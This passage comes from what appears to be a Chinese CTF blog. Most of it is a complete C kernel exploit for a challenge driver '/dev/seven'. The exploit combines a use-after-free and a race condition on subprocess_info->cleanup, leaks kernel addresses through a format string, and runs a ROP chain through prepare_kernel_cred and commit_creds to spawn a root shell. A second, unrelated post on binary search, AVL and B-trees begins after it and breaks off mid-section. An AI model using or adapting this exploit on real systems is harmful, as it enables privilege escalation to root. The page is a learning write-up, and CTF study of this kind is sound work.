pushf;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         pop user_rflags&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] got user stat\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来就是条件竞争的利用了：</p>
<ul>
<li>我们的目标是在 <code>subprocess_info-&gt;cleanup</code> 中覆盖 ROP 链（首地址）</li>
<li>由于程序有 kmalloc-128 的 UAF，所以很轻松就可以把 <code>subprocess_info</code> 分配到 <code>sctf_buf</code> 中</li>
<li>但是好像不能直接修改 <code>subprocess_info</code>，因为 <code>socket</code> 调用后，马上就会执行 <code>cleanup</code>，根本就可以修改的时间</li>
<li>采用条件竞争，在 <code>socket</code> 执行后，<code>cleanup</code> 执行前，利用 <code>write</code> 向 <code>cleanup</code> 中填入 ROP 链</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span>    </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">u_int64_t</span> KERNEL_BIN_BASE = <span class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">u_int64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">u_int64_t</span> raw_kernel;</span><br><span class="line"><span class="keyword">u_int64_t</span> pop_rdi;      <span class="comment">// pop rdi; ret;</span></span><br><span class="line"><span class="keyword">u_int64_t</span> mov_cr4_rdi;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line"><span class="keyword">u_int64_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="keyword">u_int64_t</span> commit_creds;</span><br><span class="line"><span class="keyword">u_int64_t</span> mov_rdi_rsi;  <span class="comment">// mov qword ptr [rdi], rsi; ret;</span></span><br><span class="line"><span class="keyword">u_int64_t</span> pop_rsi ;     <span class="comment">// pop rsi;ret</span></span><br><span class="line"><span class="keyword">u_int64_t</span> hook_prctl  ;</span><br><span class="line"><span class="keyword">u_int64_t</span> poweroff_work_func;</span><br><span class="line"><span class="keyword">u_int64_t</span> power_cmd ;</span><br><span class="line"><span class="keyword">u_int64_t</span> mov_rdi_rax_je_pop_pop_ret; <span class="comment">// mov rdi</span></span><br><span class="line"><span class="comment">//0xffffffff819b5084: mov rdi, rax; je 0xbb508f; mov rax, rdi; pop rbx; pop rbp; ret;</span></span><br><span class="line"><span class="keyword">u_int64_t</span> swapgs ;     <span class="comment">// swagps;ret</span></span><br><span class="line"><span class="keyword">u_int64_t</span> iretq ;</span><br><span class="line"><span class="keyword">u_int64_t</span> test_rbx_jne_pop_pop_ret;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> magic1;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x5555</span>, <span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x7777</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">u_int64_t</span> user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__ (<span class="string">&quot;.intel_syntax noprefix\n&quot;</span>);</span><br><span class="line">    <span class="function">__asm__ <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_cs, cs;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         mov user_ss, ss;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         mov user_gs, gs;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         mov user_ds, ds;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         mov user_es, es;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         mov user_rsp, rsp;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         pushf;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         pop user_rflags&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] got user stat\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">u_int64_t</span> raw_kernel;</span><br><span class="line"><span class="keyword">int</span> race_flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        race_flag = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[!] root![!] root![!] root![!] root![!] root![!] root![!] root![!] root![!] root!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[!] failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> fd = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">u_int64_t</span> xchg_eax_esp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">race</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)arg;</span><br><span class="line">  info[<span class="number">0</span>] = (<span class="keyword">u_int64_t</span>)xchg_eax_esp; <span class="comment">// cleanup将会被劫持为这里(这个gadget可以控制栈,方便进行ROP)</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)xchg_eax_esp &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] hijacked_stack: %p\n&quot;</span>, (<span class="keyword">char</span> *)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* fake_stack = <span class="literal">NULL</span>; </span><br><span class="line">  <span class="keyword">if</span>((fake_stack = mmap((<span class="keyword">char</span>*)((hijacked_stack_addr &amp; (~<span class="number">0xfff</span>))),<span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>)) == MAP_FAILED)</span><br><span class="line">      perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_stack addr: %p\n&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">  fake_stack[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">  <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = pop_rdi;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = prepare_kernel_cred;</span><br><span class="line">  hijacked_stack_ptr[index++] = mov_rdi_rax_je_pop_pop_ret;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = commit_creds;</span><br><span class="line">  hijacked_stack_ptr[index++] = swapgs;</span><br><span class="line">  hijacked_stack_ptr[index++] = iretq;</span><br><span class="line">  hijacked_stack_ptr[index++] = (<span class="keyword">u_int64_t</span>)getshell;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_cs;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_rflags;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_rsp;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_ss;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    write(fd, (<span class="keyword">void</span>*)info,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (race_flag) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u_int64_t</span> kernel_addr,onegadget,target;</span><br><span class="line">    signal(SIGSEGV, getshell);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> buf[<span class="number">0x200</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/seven&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd: %d\n&quot;</span>, fd);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    add(fd);</span><br><span class="line">    write(fd,<span class="string">&quot;%llx %llx %llx %llx %llx %llx %llx %llx %llx %llx %llx %llx &quot;</span>,<span class="number">0x80</span>);</span><br><span class="line">    show(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>,&amp;magic1);</span><br><span class="line"></span><br><span class="line">    raw_kernel = magic1 - <span class="number">0x1f3ecd</span> - KERNEL_BIN_BASE;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] raw_kernel addr : 0x%16llx\n&quot;</span>, raw_kernel);</span><br><span class="line">    xchg_eax_esp = <span class="number">0xffffffff81011cb0</span> + raw_kernel; <span class="comment">// xchg eax, esp; ret;</span></span><br><span class="line">    pop_rdi = <span class="number">0xffffffff810016e9</span>+ raw_kernel; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    mov_cr4_rdi = <span class="number">0xFFFFFFFF810460F2</span>+ raw_kernel; <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    prepare_kernel_cred = <span class="number">0xFFFFFFFF8108C780</span>+ raw_kernel;</span><br><span class="line">    commit_creds = <span class="number">0xFFFFFFFF8108C360</span>+ raw_kernel;</span><br><span class="line">    mov_rdi_rsi = <span class="number">0xffffffff81075f00</span> + raw_kernel; <span class="comment">// mov qword ptr [rdi], rsi; ret;</span></span><br><span class="line">    pop_rsi = <span class="number">0xffffffff811cad0d</span> + raw_kernel; <span class="comment">// pop rsi;ret</span></span><br><span class="line">    mov_rdi_rax_je_pop_pop_ret = <span class="number">0xffffffff819b5764</span> + raw_kernel; <span class="comment">// mov rdi</span></span><br><span class="line">    swapgs = <span class="number">0xffffffff81c00f58</span> + raw_kernel; <span class="comment">// swagps;ret</span></span><br><span class="line">    iretq = <span class="number">0xffffffff81024f92</span> + raw_kernel; <span class="comment">// iretq; ret;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] xchg addr :b *0x%16llx\n&quot;</span>, xchg_eax_esp);</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd);</span><br><span class="line">    socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> th;</span><br><span class="line">    pthread_create(&amp;th, <span class="literal">NULL</span>, race, (<span class="keyword">void</span>*)buf);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        usleep(<span class="number">1</span>);</span><br><span class="line">        socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//getshell();</span></span><br><span class="line">        <span class="keyword">if</span> (race_flag) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这是我们组里大佬出的题，学了条件竞争后我就想试试，但太菜了一直拖到今天</p>
<p>现在还是只能依葫芦画瓢，但大佬的思路的 exp 我算是看懂了</p>
<p>我觉得我还需要大量的练习，提高熟练度</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/" class="post-title-link" itemprop="url">数据结构：红黑树</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-18 11:36:25" itemprop="dateCreated datePublished" datetime="2022-06-18T11:36:25+08:00">2022-06-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-04 12:28:14" itemprop="dateModified" datetime="2022-11-04T12:28:14+08:00">2022-11-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="二叉树-BT"><a href="#二叉树-BT" class="headerlink" title="二叉树-BT"></a>二叉树-BT</h2><p>二叉树（Binary tree）是树形结构的一个重要类型</p>
<p><strong>相关术语</strong></p>
<ul>
<li>①节点：包含一个数据元素及若干指向子树分支的信息 </li>
<li>②节点的度：一个节点拥有子树的数目称为节点的度 </li>
<li>③叶子节点：也称为终端节点，没有子树的节点或者度为零的节点 </li>
<li>④分支节点：也称为非终端节点，度不为零的节点称为非终端节点 </li>
<li>⑤树的度：树中所有节点的度的最大值 </li>
<li>⑥节点的层次：从根节点开始，假设根节点为第1层，根节点的子节点为第2层，依此类推，如果某一个节点位于第L层，则其子节点位于第L+1层 </li>
<li>⑦树的深度：也称为树的高度，树中所有节点的层次最大值称为树的深度 </li>
<li>⑧有序树：如果树中各棵子树的次序是有先后次序，则称该树为有序树 </li>
<li>⑨无序树：如果树中各棵子树的次序没有先后次序，则称该树为无序树 </li>
<li>⑩森林：由m（m≥0）棵互不相交的树构成一片森林，如果把一棵非空的树的根节点删除，则该树就变成了一片森林，森林中的树由原来根节点的各棵子树构成 </li>
</ul>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655340556836-1667461359786.png" class width="1655340556836"> 
<p>树是一种重要的数据结构，其本质作用就是存储信息，接下来我们重点分析红黑树和它的前身，体会它们的优劣势</p>
<h2 id="二叉查找树-BST"><a href="#二叉查找树-BST" class="headerlink" title="二叉查找树-BST"></a>二叉查找树-BST</h2><p>二叉查找树（Binary Search Tree）又称为二叉排序树，二叉搜索树，它或者是一棵空树，或者是具有以下性质的二叉树： </p>
<ul>
<li>若它的左子树不为空，则左子树上所有结点的值都小于根结点的值</li>
<li>若它的右子树不为空，则右子树上所有结点的值都大于根结点的值</li>
<li>它的左右子树也分别是二叉搜索树</li>
</ul>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655340728810-1667461359787.png" class width="1655340728810"> 
<p>这种树最大的特点就是：左边结点 &lt; key &lt; 右边结点（子结点也是这样的性质）</p>
<p>在查找某个数据 m 时，就可以通过对比 key 与 m 的大小，来判断到底去左结点还是右结点，这种基于二分法的查找方式大大提高了效率</p>
<p>但二叉查找树也有它的缺点，先看以下例子：</p>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655341100084-1667461359787.png" class width="1655341100084">  
<p>依次插入：7，6，5，4，3，由于每一次插入的值都比对应的 key 小，所以这些数据都会插入树的左结点，发挥不出树的查找优势了（使树“退化”为链表）</p>
<p>这个问题的本质就是：树的左右两边不平衡</p>
<p>平衡二叉树就是用于解决这个问题的，而实现平衡的算法多种多样，就是效率有差别，接下来分析几个平衡算法</p>
<h2 id="二叉平衡搜索树-AVL"><a href="#二叉平衡搜索树-AVL" class="headerlink" title="二叉平衡搜索树-AVL"></a>二叉平衡搜索树-AVL</h2><p>二叉平衡搜索树是最早被发明的自平衡二叉查找树，由前苏联的数学家 <strong>A</strong>delse-<strong>V</strong>elskil 和 <strong>L</strong>andis 在 1962 年提出的高度平衡的二叉树，根据科学家的英文名也称为 AVL 树</p>
<p>它具有如下几个性质：</p>
<ul>
<li>可以是空树</li>
<li>假如不是空树，任何一个结点的左子树与右子树都是平衡二叉树</li>
<li>所有结点平衡因子的绝对值都不超过 1</li>
<li><strong>平衡因子</strong>：左子树高度 - 右子树高度</li>
</ul>
<p>下图，新插入节点 37，该树不再是平衡二叉树，因为，节点 58 的左右子树高度差为 2：</p>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655342231017-1667461359787.png" class width="1655342231017">  
<p>为了使该树重新变为平衡二叉树，需要用到 <strong>平衡二叉树的左旋/右旋</strong></p>
<p>右旋：将根节点绕左儿子 <strong>顺时针下压</strong></p>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655342431261-1667461359787.png" class width="1655342431261"> 
<p>左旋：将根节点绕右儿子 <strong>逆时针下压</strong> </p>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655342594105-1667461359787.png" class width="1655342594105"> 
<p>最后就该考虑：什么时候使用左旋，什么时候使用右旋</p>
<p>为此，需要判断调整的四种情况：</p>
<ul>
<li>LL：新插入节点为最小不平衡子树根节点的左儿子的左子树上 → 右旋使其恢复平衡</li>
<li>RR：新插入节点为最小不平衡子树根节点的右儿子的右子树上 → 左旋使其恢复平衡</li>
<li>LR：新插入节点为最小不平衡子树根节点的左儿子的右子树上 → 以左儿子为根节点进行左旋，再按原始的根节点右旋</li>
<li>RL：新插入节点为最小不平衡子树根节点的右儿子的左子树上 → 以右儿子为根节点进行右旋，再按原始的根节点左旋</li>
</ul>
<h2 id="B树-B"><a href="#B树-B" class="headerlink" title="B树-B"></a>B树-B</h2><p>B-树是一种平衡的多路查找树</p>
<ul>
<li>注意：B树就是B-树，”-“是个连字符号，不是减号</li>
</ul>
<p>我们假设我们的数据量达到了亿级别，主存当中根本存储不下，我们只能以块的形式从磁盘读取数据，与主存的访问时间相比，磁盘的 I/O 操作相当耗时，而提出 B-树的主要目的就是减少磁盘的 I/O 操作 </p>
<p>一颗 m 阶的B树定义如下：</p>
<ul>
<li>每个结点最多有 m-1 个关键字</li>
<li>根结点最少可以只有1个关键字</li>
<li>非根结点至少有 Math.ceil(m/2)-1 个关键字（Math.ceil：向上取整）</li>
<li>每个结点中的关键字都按照从小到大的顺序排列，每个关键字的左子树中的所有关键字都小于它，而右子树中的所有关键字都大于它</li>
<li>所有叶子结点都位于同一层，或者说根结点到每个叶子结点的长度都相同</li>
</ul>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655431958744-1667461359787.png" class width="1655431958744"> 
<ul>
<li>上图是一个4阶的B树，所以每个结点最多有3个关键字</li>
<li>在实际应用中的B树的阶数 m 都非常大（通常大于100），所以即使存储大量的数据，B树的高度仍然比较小</li>
<li>一个 key 和其对应的 data 称为一个记录，即键值对（key, value）</li>
</ul>
<p>B树，插入操作：</p>
<p>插入操作是指插入一条记录，即（key, value）的键值对，如果B树中已存在需要插入的键值对，则用需要插入的 value 替换旧的 value，若B树不存在这个 key，则一定是在叶子结点中进行插入操作</p>
<ul>
<li>根据要插入的 key 的值，找到叶子结点并插入</li>
<li>断当前结点 key 的个数是否小于等于 m-1，若满足则结束，否则进行第3步</li>
<li>以结点中间的 key 为中心分裂成左右两部分，然后将这个中间的 key 插入到父结点中， <strong>这个 key 的左子树指向分裂后的左半部分，这个 key 的右子支指向分裂后的右半部分，然后将当前结点指向父结点</strong> ，继续进行第3步</li>
</ul>
<p>案例如下：</p>
